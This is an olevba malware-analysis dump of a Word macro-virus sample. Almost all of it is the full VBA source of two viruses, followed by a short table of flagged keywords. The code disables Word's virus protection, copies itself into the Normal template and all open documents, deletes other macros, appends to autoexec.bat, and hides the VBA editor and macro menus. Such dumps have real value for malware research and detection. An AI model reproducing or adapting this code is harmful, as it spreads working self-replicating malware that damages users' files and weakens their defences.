olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-95a63efe6e8ef0924bf770aecbd3e7683f3a6f55
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-95a63efe6e8ef0924bf770aecbd3e7683f3a6f55 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
On Error GoTo out
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
Options.VirusProtection = False
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
Options.SaveNormalPrompt = False
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
Options.ConfirmConversions = False
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
If nt > 70 And ad > 0 Then GoTo out
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
If nt < 70 Then
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
End If
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
host.codemodule.AddFromFile ("c:\class.sys")
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
With host.codemodule
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    For x = 1 To 4
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    .deletelines 1
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    Next x
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
End With
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
If nt < 70 Then
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    With host.codemodule
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    .replaceline 1, "Sub AutoClose()"
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    .replaceline 71, "Sub ToolsMacro()"
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    End With
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
End If
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
With host.codemodule
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    For x = 2 To 72 Step 2
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
    Next x
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
End With
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
out:
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
End Sub
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
Sub ViewVBCode()
'ZMRO4/14/99 10:25:02 AMStar LC-15 on LPT1:vaniza
End Sub


-------------------------------------------------------------------------------
VBA MACRO A_OPEY_03.bas 
in file: Virus.MSWord.Class.fm-95a63efe6e8ef0924bf770aecbd3e7683f3a6f55 - OLE stream: 'Macros/VBA/A_OPEY_03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: OPEY A."
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call A_OPEY_03
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "A_OPEY_03" Then NTInfected = True
                If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "A_OPEY_03" Then ODInfected = True
                    If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next J
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub A_OPEY_03()
    On Error Resume Next
    Application.UserName = "OPEY A."
    Application.UserAddress = "CNNHS B'92 PHILIPPINES (CNSC)"
    Application.UserInitials = "LOVE"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "OPEY A."
        .Title = "LOVE"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call OnlyYou
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

